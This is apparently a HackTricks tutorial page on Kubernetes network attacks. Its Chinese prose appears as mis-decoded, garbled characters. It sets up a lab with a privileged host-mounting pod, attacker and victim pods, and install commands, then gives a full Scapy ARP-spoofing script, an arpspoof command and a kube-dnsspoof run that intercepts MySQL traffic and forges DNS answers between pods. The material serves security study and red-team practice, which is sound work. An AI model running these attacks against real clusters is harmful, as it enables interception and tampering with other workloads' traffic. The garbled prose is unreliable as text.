# Kubernetes ç½‘ç»œæ”»å‡»

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä»‹ç»

åœ¨ Kubernetes ä¸­ï¼Œè§‚å¯Ÿåˆ°é»˜è®¤è¡Œä¸ºå…è®¸åœ¨ **åŒä¸€èŠ‚ç‚¹ä¸Šæ‰€æœ‰å®¹å™¨ä¹‹é—´å»ºç«‹è¿æ¥**ã€‚è¿™é€‚ç”¨äºå‘½åç©ºé—´çš„åŒºåˆ«ã€‚è¿™æ ·çš„è¿æ¥å»¶ä¼¸åˆ° **ç¬¬ 2 å±‚**ï¼ˆä»¥å¤ªç½‘ï¼‰ã€‚å› æ­¤ï¼Œè¿™ç§é…ç½®å¯èƒ½ä½¿ç³»ç»Ÿæš´éœ²äºæ¼æ´ä¹‹ä¸­ã€‚å…·ä½“è€Œè¨€ï¼Œå®ƒä¸º **æ¶æ„å®¹å™¨** æ‰§è¡Œ **ARP æ¬ºéª—æ”»å‡»** æä¾›äº†å¯èƒ½æ€§ï¼Œç›®æ ‡æ˜¯åŒä¸€èŠ‚ç‚¹ä¸Šçš„å…¶ä»–å®¹å™¨ã€‚åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ¶æ„å®¹å™¨å¯ä»¥æ¬ºéª—æ€§åœ°æ‹¦æˆªæˆ–ä¿®æ”¹é’ˆå¯¹å…¶ä»–å®¹å™¨çš„ç½‘ç»œæµé‡ã€‚

ARP æ¬ºéª—æ”»å‡»æ¶‰åŠ **æ”»å‡»è€…åœ¨å±€åŸŸç½‘ä¸­å‘é€ä¼ªé€ çš„ ARP**ï¼ˆåœ°å€è§£æåè®®ï¼‰æ¶ˆæ¯ã€‚è¿™å¯¼è‡´ **æ”»å‡»è€…çš„ MAC åœ°å€ä¸ç½‘ç»œä¸Šåˆæ³•è®¡ç®—æœºæˆ–æœåŠ¡å™¨çš„ IP åœ°å€å…³è”**ã€‚åœ¨æˆåŠŸæ‰§è¡Œæ­¤ç±»æ”»å‡»åï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªã€ä¿®æ”¹æˆ–ç”šè‡³åœæ­¢ä¼ è¾“ä¸­çš„æ•°æ®ã€‚è¯¥æ”»å‡»åœ¨ OSI æ¨¡å‹çš„ç¬¬ 2 å±‚ä¸Šæ‰§è¡Œï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Kubernetes åœ¨æ­¤å±‚çš„é»˜è®¤è¿æ¥æ€§å¼•å‘å®‰å…¨æ‹…å¿§ã€‚

åœ¨åœºæ™¯ä¸­ï¼Œå°†åˆ›å»º 4 å°æœºå™¨ï¼š

* ubuntu-pe: ç‰¹æƒæœºå™¨ï¼Œç”¨äºé€ƒé€¸åˆ°èŠ‚ç‚¹å¹¶æ£€æŸ¥æŒ‡æ ‡ï¼ˆæ”»å‡»ä¸éœ€è¦ï¼‰
* **ubuntu-attack**: **æ¶æ„** å®¹å™¨åœ¨é»˜è®¤å‘½åç©ºé—´ä¸­
* **ubuntu-victim**: **å—å®³è€…** æœºå™¨åœ¨ kube-system å‘½åç©ºé—´ä¸­
* **mysql**: **å—å®³è€…** æœºå™¨åœ¨é»˜è®¤å‘½åç©ºé—´ä¸­
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## åŸºæœ¬çš„ Kubernetes ç½‘ç»œ

å¦‚æœæ‚¨æƒ³äº†è§£è¿™é‡Œä»‹ç»çš„ç½‘ç»œä¸»é¢˜çš„æ›´å¤šç»†èŠ‚ï¼Œè¯·æŸ¥çœ‹å‚è€ƒèµ„æ–™ã€‚

### ARP

ä¸€èˆ¬æ¥è¯´ï¼Œ**èŠ‚ç‚¹å†…éƒ¨çš„ pod-to-pod ç½‘ç»œ**æ˜¯é€šè¿‡ä¸€ä¸ªè¿æ¥æ‰€æœ‰ pod çš„ **bridge** å®ç°çš„ã€‚è¿™ä¸ª bridge è¢«ç§°ä¸ºâ€œ**cbr0**â€ã€‚ï¼ˆä¸€äº›ç½‘ç»œæ’ä»¶ä¼šå®‰è£…å®ƒä»¬è‡ªå·±çš„ bridgeã€‚ï¼‰**cbr0 è¿˜å¯ä»¥å¤„ç† ARP**ï¼ˆåœ°å€è§£æåè®®ï¼‰è§£æã€‚å½“ä¸€ä¸ªä¼ å…¥çš„æ•°æ®åŒ…åˆ°è¾¾ cbr0 æ—¶ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ ARP è§£æç›®æ ‡ MAC åœ°å€ã€‚

è¿™ä¸€äº‹å®æ„å‘³ç€ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ**åœ¨åŒä¸€èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ¯ä¸ª pod**éƒ½èƒ½å¤Ÿåœ¨ä»¥å¤ªç½‘çº§åˆ«ï¼ˆç¬¬ 2 å±‚ï¼‰ä¸åŒä¸€èŠ‚ç‚¹ä¸Šçš„ä»»ä½•å…¶ä»– pod è¿›è¡Œ**é€šä¿¡**ï¼ˆä¸å‘½åç©ºé—´æ— å…³ï¼‰ã€‚

{% hint style="warning" %}
å› æ­¤ï¼Œå¯ä»¥åœ¨åŒä¸€èŠ‚ç‚¹çš„ pod ä¹‹é—´æ‰§è¡Œ A**RP æ¬ºéª—æ”»å‡»ã€‚**
{% endhint %}

### DNS

åœ¨ Kubernetes ç¯å¢ƒä¸­ï¼Œæ‚¨é€šå¸¸ä¼šå‘ç° 1 ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰**DNS æœåŠ¡æ­£åœ¨è¿è¡Œ**ï¼Œé€šå¸¸åœ¨ kube-system å‘½åç©ºé—´ä¸­ï¼š
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
åœ¨ä¹‹å‰çš„ä¿¡æ¯ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€äº›æœ‰è¶£çš„å†…å®¹ï¼Œ**æœåŠ¡çš„IP**æ˜¯**10.96.0.10**ï¼Œä½†**è¿è¡Œè¯¥æœåŠ¡çš„podçš„IP**æ˜¯**172.17.0.2**ã€‚

å¦‚æœä½ æ£€æŸ¥ä»»ä½•podå†…éƒ¨çš„DNSåœ°å€ï¼Œä½ ä¼šå‘ç°ç±»ä¼¼è¿™æ ·çš„å†…å®¹ï¼š
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
ç„¶è€Œï¼Œpod **ä¸çŸ¥é“**å¦‚ä½•åˆ°è¾¾è¯¥**åœ°å€**ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹**podèŒƒå›´**æ˜¯172.17.0.10/26ã€‚

å› æ­¤ï¼Œpodå°†æŠŠ**DNSè¯·æ±‚å‘é€åˆ°åœ°å€10.96.0.10**ï¼Œè¯¥åœ°å€å°†è¢«cbr0**è½¬æ¢**ä¸º**172.17.0.2**ã€‚

{% hint style="warning" %}
è¿™æ„å‘³ç€podçš„**DNSè¯·æ±‚****æ€»æ˜¯**ä¼šé€šè¿‡**æ¡¥æ¥**æ¥**è½¬æ¢****æœåŠ¡IPåˆ°ç«¯ç‚¹IP**ï¼Œå³ä½¿DNSæœåŠ¡å™¨ä¸podåœ¨åŒä¸€å­ç½‘ç»œä¸­ã€‚

äº†è§£è¿™ä¸€ç‚¹ï¼Œå¹¶ä¸”çŸ¥é“**ARPæ”»å‡»æ˜¯å¯èƒ½çš„**ï¼ŒèŠ‚ç‚¹ä¸­çš„**pod**å°†èƒ½å¤Ÿ**æ‹¦æˆª**åœ¨**å­ç½‘ç»œ**ä¸­**æ¯ä¸ªpod**ä¸**æ¡¥æ¥**ä¹‹é—´çš„**æµé‡**å¹¶**ä¿®æ”¹**æ¥è‡ªDNSæœåŠ¡å™¨çš„**DNSå“åº”**ï¼ˆ**DNSæ¬ºéª—**ï¼‰ã€‚

æ­¤å¤–ï¼Œå¦‚æœ**DNSæœåŠ¡å™¨**ä¸æ”»å‡»è€…åœ¨**åŒä¸€èŠ‚ç‚¹**ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥**æ‹¦æˆªé›†ç¾¤ä¸­ä»»ä½•podçš„æ‰€æœ‰DNSè¯·æ±‚**ï¼ˆåœ¨DNSæœåŠ¡å™¨å’Œæ¡¥æ¥ä¹‹é—´ï¼‰å¹¶ä¿®æ”¹å“åº”ã€‚
{% endhint %}

## åŒä¸€èŠ‚ç‚¹ä¸­podsçš„ARPæ¬ºéª—

æˆ‘ä»¬çš„ç›®æ ‡æ˜¯**çªƒå–è‡³å°‘ä»ubuntu-victimåˆ°mysqlçš„é€šä¿¡**ã€‚

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

æ­£å¦‚ä¹‹å‰æåˆ°çš„ï¼Œå¦‚æœä½ **æ”»é™·äº†ä¸DNSæœåŠ¡å™¨podåœ¨åŒä¸€èŠ‚ç‚¹çš„pod**ï¼Œä½ å¯ä»¥é€šè¿‡**ARPSpoofing**å¯¹**æ¡¥æ¥å’ŒDNS** podè¿›è¡Œ**ä¸­é—´äººæ”»å‡»**å¹¶**ä¿®æ”¹æ‰€æœ‰DNSå“åº”**ã€‚

ä½ å¯ä»¥åœ¨[**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)æ‰¾åˆ°ä¸€ä¸ªå¾ˆå¥½çš„**å·¥å…·**å’Œ**æ•™ç¨‹**æ¥æµ‹è¯•è¿™ä¸ªã€‚

åœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œ**ä¸‹è½½**æ”»å‡»è€…podä¸­çš„**å·¥å…·**å¹¶åˆ›å»ºä¸€ä¸ª\*\*åä¸º`hosts`çš„æ–‡ä»¶\*\*ï¼Œå…¶ä¸­åŒ…å«ä½ æƒ³è¦**æ¬ºéª—**çš„**åŸŸå**ï¼Œä¾‹å¦‚ï¼š
```
cat hosts
google.com. 1.1.1.1
```
å¯¹ubuntu-victimæœºå™¨æ‰§è¡Œæ”»å‡»ï¼š
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
å¦‚æœä½ å°è¯•åˆ›å»ºè‡ªå·±çš„ DNS æ¬ºéª—è„šæœ¬ï¼Œ**ä»…ä»…ä¿®æ”¹ DNS å“åº”**æ˜¯**ä¸è¡Œçš„**ï¼Œå› ä¸º**å“åº”**å°†ä¼šæœ‰**æº IP**ï¼Œå³**æ¶æ„** **pod** çš„ IP åœ°å€ï¼Œå¹¶ä¸”**ä¸ä¼š**è¢«**æ¥å—**ã€‚\
ä½ éœ€è¦ç”Ÿæˆä¸€ä¸ª**æ–°çš„ DNS æ•°æ®åŒ…**ï¼Œå…¶**æº IP**æ˜¯å—å®³è€…å‘é€ DNS è¯·æ±‚çš„**DNS**ï¼ˆç±»ä¼¼äº 172.16.0.2ï¼Œè€Œä¸æ˜¯ 10.96.0.10ï¼Œé‚£æ˜¯ K8s DNS æœåŠ¡ IPï¼Œè€Œä¸æ˜¯ DNS æœåŠ¡å™¨ IPï¼Œæ›´å¤šå†…å®¹åœ¨ä»‹ç»ä¸­ï¼‰ã€‚
{% endhint %}

## æ•è·æµé‡

å·¥å…· [**Mizu**](https://github.com/up9inc/mizu) æ˜¯ä¸€ä¸ªç®€å•è€Œå¼ºå¤§çš„ API **æµé‡æŸ¥çœ‹å™¨**ï¼Œç”¨äº Kubernetesï¼Œèƒ½å¤Ÿè®©ä½ **æŸ¥çœ‹å¾®æœåŠ¡ä¹‹é—´çš„æ‰€æœ‰ API é€šä¿¡**ï¼Œä»¥å¸®åŠ©ä½ è°ƒè¯•å’Œæ’æŸ¥å›å½’é—®é¢˜ã€‚\
å®ƒå°†åœ¨é€‰å®šçš„ pods ä¸­å®‰è£…ä»£ç†ï¼Œæ”¶é›†å®ƒä»¬çš„æµé‡ä¿¡æ¯å¹¶åœ¨ä¸€ä¸ª web æœåŠ¡å™¨ä¸Šæ˜¾ç¤ºã€‚ç„¶è€Œï¼Œä½ éœ€è¦é«˜æƒé™çš„ K8s æƒé™ï¼ˆè€Œä¸”è¿™å¹¶ä¸æ˜¯å¾ˆéšè”½ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
